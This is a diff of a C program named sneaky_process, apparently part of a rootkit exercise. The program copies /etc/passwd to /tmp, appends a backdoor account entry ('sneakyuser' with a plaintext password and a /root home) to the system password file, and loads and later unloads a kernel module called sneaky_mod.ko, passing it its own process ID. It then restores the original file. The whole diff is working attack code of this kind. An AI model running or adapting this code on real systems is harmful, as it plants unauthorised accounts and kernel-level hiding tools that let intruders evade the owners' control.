@@ -7,10 +7,9 @@
 
 
 char * line = "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash";
-char * src = "/etc/passwd";
-char * destination = "/tmp/passwd";
-pid_t process_id;
-
+char * etc = "/etc/passwd";
+char * temp = "/tmp/passwd";
+pid_t pid;
 
 
 
@@ -22,8 +21,8 @@ void unload_module(){
     exit(EXIT_FAILURE);
   }
   else if( unload_pid == 0){
-  
-     char * argv[3] =  {"rmmod","sneaky_mod.ko", NULL};
+    
+    char * argv[3] = {"rmmod","sneaky_mod.ko", NULL};
      if(execvp("rmmod", argv) < 0){
       perror( "execution error the module un-loading process");
       exit(EXIT_FAILURE);
@@ -50,8 +49,7 @@ void unload_module(){
 
 void load_module(){
 
-  //pid_t parent_process = getppid();
-  pid_t parent_process = process_id;
+  pid_t parent_process = pid; 
   pid_t load_pid = fork();
   
   
@@ -62,7 +60,7 @@ void load_module(){
   else if( load_pid == 0){
 
     char module_arg[50];
-    snprintf(module_arg, sizeof(module_arg),"parent_id = %d\n", parent_process);
+    snprintf(module_arg,sizeof(module_arg), "parent_id = %d\n", parent_process);
     char * argv[4] = {"insmod", "sneaky_mod.ko", module_arg, NULL};
     
     if(execvp("insmod", argv) < 0){
@@ -70,6 +68,7 @@ void load_module(){
       exit(EXIT_FAILURE);
     }
   }
+
   else{
 
     int wait_status;
@@ -93,7 +92,7 @@ void copy_file(char * src,  char * destination){
 
 
   //char * command = "cp";
-  char * argv[] = {"cp", src, destination, NULL};
+  char * argv[4] = {"cp", src, destination, NULL};
   pid_t copy_pid = fork();
 
   if(copy_pid < 0){
@@ -120,10 +119,13 @@ void copy_file(char * src,  char * destination){
     
   }
 
+}
 
-  if(strcmp(src,"/etc/passwd") == 0){
+
+void add_sneaky_line (char * filename){
+
     FILE * file;
-    file = fopen(src, "a"); //open file in append mode
+    file = fopen(filename, "a"); //open file in append mode
   if(file == NULL) {
     perror("Error opening the password file.");
   }
@@ -131,8 +133,6 @@ void copy_file(char * src,  char * destination){
     fputs(line, file);
     fclose(file);
    }
-}
-
 }
 
 
@@ -151,12 +151,15 @@ void loop(){
 int main(){
 
   //Print process PID
-  process_id = getpid();
-  printf("sneaky_process pid = %d\n", process_id);
+  pid = getpid();
+  printf("sneaky_process pid = %d\n", pid);
 
   //First malicious act. Copy /etc/passwd file to a new file: /tmp/passwd
-  copy_file(src, destination);
+  copy_file(etc, temp);
 
+  //Add the line
+  add_sneaky_line(etc);
+  
   //Load the sneaky module using the insmod command
   load_module();
 
@@ -167,7 +170,7 @@ int main(){
   unload_module();
 
   //Restore the original file
-  copy_file(destination, src);
+  copy_file(temp, etc);
 
   
 }
